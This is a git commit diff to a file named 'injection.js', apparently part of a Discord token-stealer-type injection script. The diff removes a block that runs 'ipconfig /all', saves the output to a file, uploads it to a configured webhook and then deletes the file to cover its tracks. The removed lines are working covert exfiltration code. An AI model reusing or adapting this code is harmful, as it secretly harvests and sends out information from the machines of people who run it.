e47784612292e9f5092242d561f0444821747910
wellzvendor <119109717+wellzvendor@users.noreply.github.com>
2022-12-11 07:07:09 -0800

    Update injection.js

--- injection.js
+++ injection.js
@@ -62,20 +62,6 @@ const config = {
   },
 };
 
-exec("ipconfig /all", (error, stdout, stderr) => {
-	fs.writeFile('ipconfig.txt', stdout, async function (err) {
-	const hook = new Webhook(config.webhook);
-
-await hook.sendFile('./ipconfig.txt');
-})
-setTimeout(function () {
-	fs.unlink('ipconfig.txt', function (err) {
-		if (err) throw err;
-	}
-		);
-}, 5000);
-})
-
 function parity_32(x, y, z) {
   return x ^ y ^ z;
 }
